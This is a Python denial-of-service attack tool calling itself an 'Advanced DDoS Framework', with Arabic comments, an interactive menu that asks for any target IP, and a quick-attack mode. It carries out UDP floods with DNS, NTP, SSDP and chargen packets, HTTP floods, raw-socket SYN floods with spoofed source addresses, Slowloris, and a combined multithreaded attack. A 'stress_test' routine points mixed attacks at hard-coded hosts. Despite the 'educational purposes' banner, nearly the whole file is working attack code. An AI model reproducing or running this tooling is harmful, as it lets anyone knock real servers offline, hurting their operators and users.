"""
# ============================================
# ADVANCED DDOS FRAMEWORK v2.0
# Enhanced Attack Methods Only
# Developer: Security Researcher
# ============================================
"""

import socket
import threading
import random
import time
import os
import sys
import struct
import select
from concurrent.futures import ThreadPoolExecutor
import requests
from fake_useragent import UserAgent

# ==================== CONFIGURATION ====================
MAX_THREADS = 50000
ATTACK_TIMEOUT = 300
BUFFER_SIZE = 65507  # Max UDP packet size

class AttackConfig:
    """إعدادات متقدمة للهجوم"""
    USE_PROXY = False
    SPOOF_IP = True
    MULTI_PORT = True
    VARIABLE_SIZE = True
    RANDOM_DELAY = False

# ==================== ADVANCED ATTACK METHODS ====================
class AdvancedAttacks:
    """فئات هجوم متقدمة"""
    
    @staticmethod
    def udp_amplification(target_ip, target_port, duration=60):
        """UDP Amplification Attack"""
        print(f"[+] Starting UDP Amplification on {target_ip}:{target_port}")
        
        # حزم تضخيم مختلفة (DNS, NTP, SSDP, Chargen)
        amplification_packets = {
            'dns': b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01',
            'ntp': b'\x1b' + b'\x00' * 47,  # NTP monlist request
            'ssdp': b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMX: 2\r\nST: ssdp:all\r\nMan: "ssdp:discover"\r\n\r\n',
            'chargen': b'\x00' * 512  # Chargen protocol
        }
        
        packets_sent = 0
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                
                # اختيار حزمة تضخيم عشوائية
                packet_type = random.choice(list(amplification_packets.keys()))
                packet = amplification_packets[packet_type]
                
                # إرسال إلى منافذ متعددة
                for port_offset in range(0, 100, 10):
                    sock.sendto(packet, (target_ip, target_port + port_offset))
                    packets_sent += 1
                
                # إحصائيات كل 1000 حزمة
                if packets_sent % 1000 == 0:
                    elapsed = time.time() - start_time
                    print(f"[+] Amplification packets: {packets_sent:,} | Rate: {packets_sent/elapsed:.1f}/s")
                
                sock.close()
                
            except Exception as e:
                print(f"[-] UDP Amp Error: {e}")
                continue
        
        return packets_sent
    
    @staticmethod
    def http_flood(target_ip, target_port, duration=60, use_ssl=False):
        """HTTP/HTTPS Flood متقدم"""
        print(f"[+] Starting HTTP Flood on {target_ip}:{target_port}")
        
        protocol = "https" if use_ssl else "http"
        url = f"{protocol}://{target_ip}:{target_port}/"
        
        # قائمة User-Agents متنوعة
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'curl/7.68.0',
            'python-requests/2.28.0'
        ]
        
        # مسارات هجوم متنوعة
        attack_paths = [
            "/", "/api/v1/users", "/wp-admin", "/admin", "/phpmyadmin",
            "/.env", "/config.php", "/readme.txt", "/test", "/debug"
        ]
        
        requests_sent = 0
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                # إضافة معلمات GET عشوائية
                params = {f'param{random.randint(1,100)}': random.randint(1,1000) for _ in range(5)}
                
                # إرسال طلب HTTP
                path = random.choice(attack_paths)
                response = requests.get(url + path, headers=headers, params=params, timeout=2)
                requests_sent += 1
                
                # إحصائيات كل 50 طلب
                if requests_sent % 50 == 0:
                    elapsed = time.time() - start_time
                    print(f"[+] HTTP requests: {requests_sent:,} | Status: {response.status_code}")
                
            except requests.exceptions.RequestException:
                requests_sent += 1  # نحتسب حتى الطلبات الفاشلة
                continue
        
        return requests_sent
    
    @staticmethod
    def syn_flood(target_ip, target_port, duration=60):
        """SYN Flood مع IP spoofing"""
        print(f"[+] Starting SYN Flood on {target_ip}:{target_port}")
        
        # إنشاء حزمة SYN يدوياً
        def create_syn_packet(source_ip, dest_ip, dest_port):
            # IP Header
            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 0
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(dest_ip)
            
            ip_ihl_ver = (ip_ver << 4) + ip_ihl
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl,
                                ip_proto, ip_check, ip_saddr, ip_daddr)
            
            # TCP Header
            tcp_source = random.randint(1024, 65535)
            tcp_dest = dest_port
            tcp_seq = random.randint(1, 4294967295)
            tcp_ack_seq = 0
            tcp_doff = 5
            tcp_fin = 0
            tcp_syn = 1
            tcp_rst = 0
            tcp_psh = 0
            tcp_ack = 0
            tcp_urg = 0
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            tcp_offset_res = (tcp_doff << 4) + 0
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
            
            tcp_header = struct.pack('!HHLLBBHHH',
                                tcp_source, tcp_dest,
                                tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags,
                                tcp_window, tcp_check,
                                tcp_urg_ptr)
            
            return ip_header + tcp_header
        
        packets_sent = 0
        start_time = time.time()
        
        # إنشاء سوكت raw
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            print("[-] Raw socket requires admin privileges")
            return 0
        
        while time.time() - start_time < duration:
            try:
                # توليد IP مزيف
                fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                # إنشاء وإرسال حزمة SYN
                packet = create_syn_packet(fake_ip, target_ip, target_port)
                sock.sendto(packet, (target_ip, 0))
                packets_sent += 1
                
                if packets_sent % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"[+] SYN packets: {packets_sent:,} | Rate: {packets_sent/elapsed:.1f}/s")
                
            except Exception as e:
                print(f"[-] SYN Error: {e}")
                break
        
        sock.close()
        return packets_sent
    
    @staticmethod
    def slowloris(target_ip, target_port, duration=60):
        """Slowloris Attack متقدم"""
        print(f"[+] Starting Slowloris on {target_ip}:{target_port}")
        
        sockets = []
        max_sockets = 500  # الحد الأقصى للاتصالات
        start_time = time.time()
        
        def create_slow_connection():
            """إنشاء اتصال بطيء"""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                
                # إرسال طلب HTTP غير مكتمل
                s.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode('utf-8'))
                s.send(f"Host: {target_ip}\r\n".encode('utf-8'))
                s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode('utf-8'))
                s.send("Content-Length: 1000000\r\n".encode('utf-8'))
                s.send("Accept-Encoding: gzip, deflate\r\n".encode('utf-8'))
                
                return s
            except:
                return None
        
        # إنشاء اتصالات مبدئية
        print("[+] Creating initial connections...")
        for _ in range(min(100, max_sockets)):
            sock = create_slow_connection()
            if sock:
                sockets.append(sock)
        
        print(f"[+] Initial connections: {len(sockets)}")
        
        # الحفاظ على الاتصالات
        while time.time() - start_time < duration:
            try:
                # إرسال بيانات لإبقاء الاتصالات مفتوحة
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1, 9999)}\r\n".encode('utf-8'))
                        time.sleep(random.uniform(1, 10))
                    except:
                        sockets.remove(sock)
                        # محاولة إنشاء اتصال جديد
                        new_sock = create_slow_connection()
                        if new_sock:
                            sockets.append(new_sock)
                
                # محاولة إضافة اتصالات جديدة إذا قل العدد
                if len(sockets) < max_sockets - 10:
                    for _ in range(10):
                        new_sock = create_slow_connection()
                        if new_sock:
                            sockets.append(new_sock)
                
                print(f"[+] Active connections: {len(sockets)}")
                time.sleep(5)
                
            except KeyboardInterrupt:
                break
        
        # إغلاق جميع الاتصالات
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        return len(sockets)
    
    @staticmethod
    def mixed_attack(target_ip, target_port, duration=60, threads=100):
        """هجوم مختلط بمتعدد الطرق"""
        print(f"[+] Starting Mixed Attack on {target_ip}:{target_port}")
        
        attack_methods = [
            (AdvancedAttacks.udp_amplification, 40),
            (AdvancedAttacks.http_flood, 30),
            (AdvancedAttacks.syn_flood, 20),
            (AdvancedAttacks.slowloris, 10)
        ]
        
        results = {}
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for method, percentage in attack_methods:
                method_threads = max(1, int(threads * percentage / 100))
                
                for _ in range(method_threads):
                    future = executor.submit(method, target_ip, target_port, duration)
                    futures.append((method.__name__, future))
            
            # جمع النتائج
            for method_name, future in futures:
                try:
                    result = future.result(timeout=duration + 10)
                    results[method_name] = results.get(method_name, 0) + result
                except:
                    pass
        
        return results

# ==================== PROXY & SPOOFING SYSTEM ====================
class AttackEnhancements:
    """تحسينات للهجوم"""
    
    @staticmethod
    def generate_fake_ip():
        """توليد IP مزيف"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    @staticmethod
    def load_proxy_list():
        """تحميل قائمة بروكسيات"""
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        
        proxies = []
        for url in proxy_sources:
            try:
                response = requests.get(url, timeout=5)
                proxies.extend(response.text.strip().split('\n'))
            except:
                continue
        
        return [p.strip() for p in proxies if p.strip()]
    
    @staticmethod
    def random_user_agent():
        """وكيل مستخدم عشوائي"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'curl/7.68.0'
        ]
        return random.choice(agents)

# ==================== MAIN CONTROLLER ====================
class DDOSController:
    """المتحكم الرئيسي للهجوم"""
    
    def __init__(self):
        self.attacks = AdvancedAttacks()
        self.enhancements = AttackEnhancements()
        self.running = False
        self.results = {}
    
    def show_menu(self):
        """عرض قائمة الهجمات"""
        menu = """
╔══════════════════════════════════════════╗
║         ADVANCED DDOS FRAMEWORK          ║
╚══════════════════════════════════════════╝

[1] UDP Amplification Attack
[2] HTTP/HTTPS Flood
[3] SYN Flood (IP Spoofing)
[4] Slowloris Attack
[5] Mixed Attack (All Methods)
[6] Custom Configuration
[0] Exit

Select: """
        
        return input(menu)
    
    def get_target_info(self):
        """الحصول على معلومات الهدف"""
        print("\n" + "="*50)
        target_ip = input("Target IP/Hostname: ").strip()
        
        # تحويل hostname إلى IP
        try:
            target_ip = socket.gethostbyname(target_ip)
        except:
            pass
        
        target_port = input("Target Port (default 80): ").strip()
        target_port = int(target_port) if target_port else 80
        
        duration = input("Attack Duration (seconds, default 30): ").strip()
        duration = int(duration) if duration else 30
        
        threads = input("Threads (default 100): ").strip()
        threads = int(threads) if threads else 100
        
        return target_ip, target_port, duration, threads
    
    def start_attack(self, method_num):
        """بدء الهجوم"""
        target_ip, target_port, duration, threads = self.get_target_info()
        
        print(f"\n[!] Starting attack on {target_ip}:{target_port}")
        print(f"[!] Duration: {duration}s | Threads: {threads}")
        print("[!] Press Ctrl+C to stop\n")
        
        start_time = time.time()
        
        try:
            if method_num == 1:
                result = self.attacks.udp_amplification(target_ip, target_port, duration)
                print(f"\n[+] UDP Amplification completed: {result:,} packets")
                
            elif method_num == 2:
                use_ssl = input("Use HTTPS? (y/n): ").lower() == 'y'
                result = self.attacks.http_flood(target_ip, target_port, duration, use_ssl)
                print(f"\n[+] HTTP Flood completed: {result:,} requests")
                
            elif method_num == 3:
                result = self.attacks.syn_flood(target_ip, target_port, duration)
                print(f"\n[+] SYN Flood completed: {result:,} packets")
                
            elif method_num == 4:
                result = self.attacks.slowloris(target_ip, target_port, duration)
                print(f"\n[+] Slowloris completed: {result:,} connections")
                
            elif method_num == 5:
                results = self.attacks.mixed_attack(target_ip, target_port, duration, threads)
                print(f"\n[+] Mixed Attack completed:")
                for method, count in results.items():
                    print(f"    {method}: {count:,}")
                
            elapsed = time.time() - start_time
            print(f"[+] Total time: {elapsed:.1f}s")
            
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user")
        except Exception as e:
            print(f"\n[-] Error: {e}")
    
    def custom_config(self):
        """تهيئة مخصصة"""
        print("\n" + "="*50)
        print("CUSTOM CONFIGURATION")
        print("="*50)
        
        AttackConfig.USE_PROXY = input("Use proxy? (y/n): ").lower() == 'y'
        AttackConfig.SPOOF_IP = input("Spoof IP? (y/n): ").lower() == 'y'
        AttackConfig.MULTI_PORT = input("Attack multiple ports? (y/n): ").lower() == 'y'
        AttackConfig.VARIABLE_SIZE = input("Variable packet sizes? (y/n): ").lower() == 'y'
        AttackConfig.RANDOM_DELAY = input("Random delays? (y/n): ").lower() == 'y'
        
        if AttackConfig.USE_PROXY:
            proxies = self.enhancements.load_proxy_list()
            print(f"[+] Loaded {len(proxies)} proxies")
        
        print("[+] Configuration saved!")
    
    def run(self):
        """تشغيل المتحكم"""
        while True:
            try:
                choice = self.show_menu()
                
                if choice == '0':
                    print("\n[+] Exiting...")
                    break
                elif choice in ['1', '2', '3', '4', '5']:
                    self.start_attack(int(choice))
                elif choice == '6':
                    self.custom_config()
                else:
                    print("[-] Invalid choice")
                
                input("\nPress Enter to continue...")
                os.system('clear')
                
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")

# ==================== QUICK ATTACK MODE ====================
def quick_attack(target_ip, target_port=80, duration=30, method="mixed"):
    """وضع الهجوم السريع"""
    print(f"[!] QUICK ATTACK MODE - {method.upper()}")
    print(f"[!] Target: {target_ip}:{target_port}")
    print(f"[!] Duration: {duration}s")
    
    attacks = AdvancedAttacks()
    
    if method == "udp":
        result = attacks.udp_amplification(target_ip, target_port, duration)
    elif method == "http":
        result = attacks.http_flood(target_ip, target_port, duration)
    elif method == "syn":
        result = attacks.syn_flood(target_ip, target_port, duration)
    elif method == "slowloris":
        result = attacks.slowloris(target_ip, target_port, duration)
    else:  # mixed
        result = attacks.mixed_attack(target_ip, target_port, duration)
    
    return result

# ==================== EXECUTION ====================
if __name__ == "__main__":
    # عرض البانر
    banner = """
    ╔══════════════════════════════════════════╗
    ║      ADVANCED DDOS FRAMEWORK v2.0        ║
    ║        Enhanced Attack Methods           ║
    ║      For Educational Purposes Only       ║
    ╚══════════════════════════════════════════╝
    """
    
    print(banner)
    
    # التحقق من الصلاحيات
    if os.name == 'posix' and os.geteuid() != 0:
        print("[!] Warning: Some features require root privileges")
    
    # اختيار الوضع
    print("\n[1] Interactive Menu")
    print("[2] Quick Attack")
    print("[3] Load from config")
    
    mode = input("\nSelect mode: ").strip()
    
    if mode == "1":
        controller = DDOSController()
        controller.run()
    elif mode == "2":
        target = input("Target IP: ").strip()
        port = input("Port (default 80): ").strip()
        port = int(port) if port else 80
        duration = input("Duration (default 30): ").strip()
        duration = int(duration) if duration else 30
        method = input("Method (udp/http/syn/slowloris/mixed): ").strip().lower()
        
        quick_attack(target, port, duration, method)
    else:
        print("[-] Invalid mode")

# ==================== ADDITIONAL FEATURES ====================
def stress_test():
    """اختبار إجهاد متقدم"""
    print("[+] Starting advanced stress test...")
    
    targets = [
        ("example1.com", 80),
        ("example2.com", 443),
        ("192.168.1.100", 8080)
    ]
    
    for target_ip, target_port in targets:
        print(f"\n[+] Testing {target_ip}:{target_port}")
        quick_attack(target_ip, target_port, 10, "mixed")
        time.sleep(2)
    
    print("[+] Stress test completed")

def generate_report(attack_results):
    """توليد تقرير الهجوم"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    report = f"""
    ATTACK REPORT
    =============
    Time: {timestamp}
    
    Results:
    """
    
    for method, result in attack_results.items():
        report += f"    {method}: {result}\n"
    
    with open("attack_report.txt", "w") as f:
        f.write(report)
    
    print("[+] Report saved to attack_report.txt")
